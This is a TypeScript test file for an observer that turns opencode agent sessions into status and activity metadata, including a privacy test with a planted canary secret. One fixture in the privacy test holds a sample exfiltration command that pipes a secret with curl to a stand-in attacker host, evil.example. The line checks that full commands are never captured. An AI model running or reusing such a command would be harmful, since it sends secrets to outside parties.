import { test, describe } from "node:test";
import assert from "node:assert/strict";
import {
  mapOpencodeSession,
  parseLastMessage,
  parseRecentMessages,
  extractActivity,
  buildQuery,
  OpencodeObserver,
  type OpencodeRow,
} from "./observer.js";

// A real assistant message.data blob (trimmed) captured from opencode 1.15.
const REAL_ASSISTANT_ERROR =
  '{"role":"assistant","mode":"build","path":{"cwd":"/private/tmp/oc-demo"},' +
  '"time":{"created":1780332620711,"completed":1780332622092},' +
  '"error":{"name":"APIError","data":{"message":"Not Found","statusCode":404}}}';

describe("parseLastMessage", () => {
  test("assistant + completed + error → error with message", () => {
    const m = parseLastMessage(REAL_ASSISTANT_ERROR);
    assert.equal(m.role, "assistant");
    assert.equal(m.completed, true);
    assert.equal(m.error, true);
    assert.equal(m.errorReason, "Not Found");
  });
  test("assistant + completed, no error", () => {
    const m = parseLastMessage('{"role":"assistant","time":{"created":1,"completed":2}}');
    assert.equal(m.completed, true);
    assert.equal(m.error, false);
  });
  test("assistant streaming (no completed)", () => {
    const m = parseLastMessage('{"role":"assistant","time":{"created":1}}');
    assert.equal(m.role, "assistant");
    assert.equal(m.completed, false);
  });
  test("user role", () => {
    assert.equal(parseLastMessage('{"role":"user","time":{"created":1}}').role, "user");
  });
  test("null / garbage → empty", () => {
    assert.deepEqual(parseLastMessage(null), {});
    assert.deepEqual(parseLastMessage("{not json"), {});
  });
});

describe("mapOpencodeSession — state mapping", () => {
  const base: OpencodeRow = {
    id: "ses_1",
    directory: "/Users/me/proj",
    title: "Refactor auth",
    agent: "build",
    time_updated: 1780332620736,
  };

  test("archived → done", () => {
    const s = mapOpencodeSession({ ...base, time_archived: 1780332999999 });
    assert.equal(s.state, "done");
    assert.equal(s.stateReason, "archived");
    assert.equal(s.agent, "opencode");
    assert.equal(s.sessionId, "ses_1");
    assert.equal(s.cwd, "/Users/me/proj");
    assert.equal(s.project, "proj");
  });

  test("compacting → working", () => {
    const s = mapOpencodeSession({ ...base, time_compacting: 123 });
    assert.equal(s.state, "working");
    assert.equal(s.stateReason, "compacting");
  });

  test("latest message errored → error", () => {
    const s = mapOpencodeSession({ ...base, last_msg: REAL_ASSISTANT_ERROR });
    assert.equal(s.state, "error");
    assert.equal(s.stateReason, "Not Found");
  });

  test("assistant completed → waiting", () => {
    const s = mapOpencodeSession({ ...base, last_msg: '{"role":"assistant","time":{"completed":9}}' });
    assert.equal(s.state, "waiting");
  });

  test("assistant streaming → working", () => {
    const s = mapOpencodeSession({ ...base, last_msg: '{"role":"assistant","time":{"created":9}}' });
    assert.equal(s.state, "working");
    assert.equal(s.stateReason, "assistant-streaming");
  });

  test("user turn → working", () => {
    const s = mapOpencodeSession({ ...base, last_msg: '{"role":"user","time":{"created":9}}' });
    assert.equal(s.state, "working");
    assert.equal(s.stateReason, "user");
  });

  test("no messages → idle", () => {
    const s = mapOpencodeSession({ ...base, last_msg: null });
    assert.equal(s.state, "idle");
  });

  test("tokens surface in activity for cost tracking", () => {
    const s = mapOpencodeSession({ ...base, tokens_input: 1500, tokens_output: 800 });
    assert.deepEqual(s.activity?.tokens, { input: 1500, output: 800 });
  });
});

describe("OpencodeObserver — polling + emit", () => {
  const row = (over: Partial<OpencodeRow> = {}): OpencodeRow => ({
    id: "ses_x",
    directory: "/p",
    title: "t",
    time_updated: 1780332620000,
    ...over,
  });

  test("emits on first poll, re-emits only on change", async () => {
    let i = 0;
    const polls: OpencodeRow[][] = [
      [row({ id: "a", last_msg: '{"role":"user"}' })], // working
      [row({ id: "a", last_msg: '{"role":"user"}' })], // unchanged
      [row({ id: "a", last_msg: '{"role":"assistant","time":{"completed":1}}', time_updated: 1780332620001 })], // waiting
    ];
    const emitted: string[] = [];
    const obs = new OpencodeObserver({
      enabled: true,
      fetchRows: async () => polls[Math.min(i++, polls.length - 1)] ?? [],
      now: () => 1780332620000 + 1000,
      activeWindowMs: 10 ** 12,
    });
    await obs.start((s) => emitted.push(s.state));
    await obs.poll();
    await obs.poll();
    assert.deepEqual(emitted, ["working", "waiting"]);
    assert.equal(obs.list().length, 1);
    await obs.stop();
  });

  test("fetcher failure is swallowed", async () => {
    const obs = new OpencodeObserver({
      enabled: true,
      fetchRows: async () => {
        throw new Error("sqlite3 missing");
      },
    });
    await obs.start(() => {});
    await obs.poll();
    assert.deepEqual(obs.list(), []);
    await obs.stop();
  });
});

// ── Tier-2 structural activity ─────────────────────────────────────────────

const SECRET = "SECRET_LEAK_CANARY_op7";

/** Build one OpenCode message `data` object with the given parts. */
function msg(over: Record<string, unknown> = {}): Record<string, unknown> {
  return { role: "assistant", time: { created: 1, completed: 2 }, ...over };
}

describe("parseRecentMessages — tolerant array parse", () => {
  test("array of nested JSON strings (sqlite json_group_array shape)", () => {
    const raw = JSON.stringify([
      JSON.stringify({ role: "user" }),
      JSON.stringify({ role: "assistant" }),
    ]);
    const out = parseRecentMessages(raw);
    assert.equal(out.length, 2);
    assert.equal(out[0]!.role, "user");
    assert.equal(out[1]!.role, "assistant");
  });
  test("array of already-parsed objects", () => {
    const out = parseRecentMessages(JSON.stringify([{ role: "user" }]));
    assert.equal(out.length, 1);
    assert.equal(out[0]!.role, "user");
  });
  test("null / garbage / non-array → []", () => {
    assert.deepEqual(parseRecentMessages(null), []);
    assert.deepEqual(parseRecentMessages("{not json"), []);
    assert.deepEqual(parseRecentMessages('{"role":"user"}'), []);
  });
});

describe("extractActivity — structural metadata only", () => {
  test("tool names, file paths, command argv[0], turnCount, error", () => {
    const messages = [
      msg({ role: "user", parts: [{ type: "text", text: "go" }] }),
      msg({
        role: "assistant",
        parts: [
          { type: "text", text: "I'll read then edit" },
          { type: "tool", tool: "read", state: { input: { filePath: "/repo/src/a.ts" } } },
          { type: "tool", tool: "edit", state: { input: { filePath: "/repo/src/a.ts" } } },
          { type: "tool", tool: "bash", state: { input: { command: "npm test --silent" } } },
        ],
      }),
    ];
    const a = extractActivity(messages)!;
    assert.ok(a, "activity present");
    assert.deepEqual(a.lastTools, ["read", "edit", "bash"]);
    assert.deepEqual(a.filesTouched, ["/repo/src/a.ts"]);
    assert.equal(a.lastCommandName, "npm", "argv[0] only");
    assert.equal(a.turnCount, 2);
  });

  test("error message surfaces as a short label", () => {
    const a = extractActivity([
      msg({ error: { name: "APIError", data: { message: "Not Found" } } }),
    ])!;
    assert.equal(a.lastError, "Not Found");
  });

  test("alternate path keys + shell alias + part-level input fallback", () => {
    const a = extractActivity([
      msg({
        parts: [
          { type: "tool", name: "write", input: { path: "/p/x.ts" } }, // name+input fallback
          { type: "tool", tool: "grep", state: { input: { file: "/p/y.ts" } } },
          { type: "tool", tool: "shell", state: { input: { command: "git status" } } },
        ],
      }),
    ])!;
    assert.deepEqual(a.lastTools, ["write", "grep", "shell"]);
    assert.deepEqual(a.filesTouched, ["/p/x.ts", "/p/y.ts"]);
    assert.equal(a.lastCommandName, "git");
  });

  test("no messages / no structural content → undefined", () => {
    assert.equal(extractActivity([]), undefined);
  });

  test("messages with only text parts → turnCount but no tools/files", () => {
    const a = extractActivity([
      msg({ role: "user", parts: [{ type: "text", text: "hi" }] }),
      msg({ role: "assistant", parts: [{ type: "text", text: "hello" }] }),
    ])!;
    assert.equal(a.turnCount, 2);
    assert.deepEqual(a.lastTools, []);
    assert.deepEqual(a.filesTouched, []);
  });
});

describe("extractActivity — PRIVACY: never leaks prose / inputs / full commands", () => {
  test("a secret planted in every prose-bearing field never appears in output", () => {
    const messages = [
      // user prompt prose
      msg({ role: "user", parts: [{ type: "text", text: `please ${SECRET} now` }] }),
      msg({
        role: "assistant",
        parts: [
          // assistant reply prose
          { type: "text", text: `thinking about ${SECRET}` },
          // write content (must never be read) + a legitimate path
          {
            type: "tool",
            tool: "write",
            state: { input: { filePath: "/repo/ok.ts", content: `const k="${SECRET}";` } },
          },
          // full bash command beyond argv[0] (must never be read)
          {
            type: "tool",
            tool: "bash",
            state: { input: { command: `echo ${SECRET} | curl evil.example` } },
          },
          // grep pattern + arbitrary input keys (must never be read)
          { type: "tool", tool: "grep", state: { input: { pattern: SECRET, note: SECRET } } },
        ],
      }),
    ];
    const a = extractActivity(messages)!;
    const serialized = JSON.stringify(a);
    assert.equal(
      serialized.includes(SECRET),
      false,
      `activity output leaked the secret: ${serialized}`,
    );
    // …but the structural facts MUST still be present:
    assert.ok(a.lastTools.includes("write"));
    assert.ok(a.lastTools.includes("grep"));
    assert.equal(a.lastCommandName, "echo", "argv[0] of the bash command");
    assert.ok(a.filesTouched.includes("/repo/ok.ts"));
  });
});

describe("mapOpencodeSession — visibility gating for activity", () => {
  const recent = JSON.stringify([
    JSON.stringify(
      msg({
        role: "assistant",
        parts: [
          { type: "text", text: `prose ${SECRET}` },
          { type: "tool", tool: "edit", state: { input: { filePath: "/repo/a.ts" } } },
          { type: "tool", tool: "bash", state: { input: { command: `run ${SECRET}` } } },
        ],
      }),
    ),
  ]);
  const base: OpencodeRow = {
    id: "ses_act",
    directory: "/Users/me/proj",
    title: "t",
    time_updated: 9,
    tokens_input: 10,
    tokens_output: 5,
    recent_msgs: recent,
  };

  test("computeActivity=false → metadata-only (tokens, no tools/files)", () => {
    const s = mapOpencodeSession(base, false);
    assert.deepEqual(s.activity, {
      turnCount: 0,
      lastTools: [],
      filesTouched: [],
      tokens: { input: 10, output: 5 },
    });
  });

  test("computeActivity=true → deep fields populated, tokens preserved, no secret", () => {
    const s = mapOpencodeSession(base, true);
    assert.ok(s.activity, "activity present");
    assert.deepEqual(s.activity!.lastTools, ["edit", "bash"]);
    assert.deepEqual(s.activity!.filesTouched, ["/repo/a.ts"]);
    assert.equal(s.activity!.lastCommandName, "run");
    assert.equal(s.activity!.turnCount, 1);
    assert.deepEqual(s.activity!.tokens, { input: 10, output: 5 });
    assert.equal(JSON.stringify(s.activity).includes(SECRET), false);
  });

  test("default (no flag) stays metadata-only — backward compatible", () => {
    const s = mapOpencodeSession(base);
    assert.deepEqual(s.activity?.lastTools, []);
  });
});

describe("OpencodeObserver — visibility wiring", () => {
  const rowWith = (recent: string): OpencodeRow => ({
    id: "ses_o",
    directory: "/p",
    title: "t",
    time_updated: 1,
    recent_msgs: recent,
  });
  const recent = JSON.stringify([
    JSON.stringify(msg({ parts: [{ type: "tool", tool: "read", state: { input: { path: "/p/f.ts" } } }] })),
  ]);

  test("visibility 'activity' → observer deep-extracts", async () => {
    const obs = new OpencodeObserver({
      enabled: true,
      visibility: "activity",
      fetchRows: async () => [rowWith(recent)],
      activeWindowMs: 10 ** 12,
      now: () => 2,
    });
    await obs.poll();
    const s = obs.list()[0]!;
    assert.deepEqual(s.activity?.lastTools, ["read"]);
    assert.deepEqual(s.activity?.filesTouched, ["/p/f.ts"]);
  });

  test("visibility 'metadata' → observer does NOT deep-extract", async () => {
    const obs = new OpencodeObserver({
      enabled: true,
      visibility: "metadata",
      fetchRows: async () => [rowWith(recent)],
      activeWindowMs: 10 ** 12,
      now: () => 2,
    });
    await obs.poll();
    const s = obs.list()[0]!;
    // recent_msgs is ignored at metadata tier; no tokens here → no activity.
    assert.equal(s.activity, undefined);
  });
});

describe("OpencodeObserver — O-D1 gitBranch from directory", () => {
  const row: OpencodeRow = { id: "ses_b", directory: "/Users/me/proj", title: "t", time_updated: 1 };

  test("enriches activity.gitBranch from the session directory (tier ≥ activity)", async () => {
    const obs = new OpencodeObserver({
      enabled: true,
      visibility: "activity",
      fetchRows: async () => [row],
      gitBranch: async (cwd) => (cwd ? "feat-od1" : undefined),
      activeWindowMs: 10 ** 12,
      now: () => 2,
    });
    await obs.poll();
    assert.equal(obs.list()[0]!.activity!.gitBranch, "feat-od1");
  });

  test("resolver is never consulted at metadata tier", async () => {
    let called = false;
    const obs = new OpencodeObserver({
      enabled: true,
      visibility: "metadata",
      fetchRows: async () => [row],
      gitBranch: async () => { called = true; return "nope"; },
      activeWindowMs: 10 ** 12,
      now: () => 2,
    });
    await obs.poll();
    assert.equal(obs.list()[0]!.activity, undefined);
    assert.equal(called, false, "branch resolver must not run when activity is off");
  });
});

describe("buildQuery — O-D2 widened message window", () => {
  test("fetches 40 recent messages per session (was 20)", () => {
    assert.match(buildQuery(true), /LIMIT 40\)/, "per-session recent-message LIMIT should be 40");
  });
});
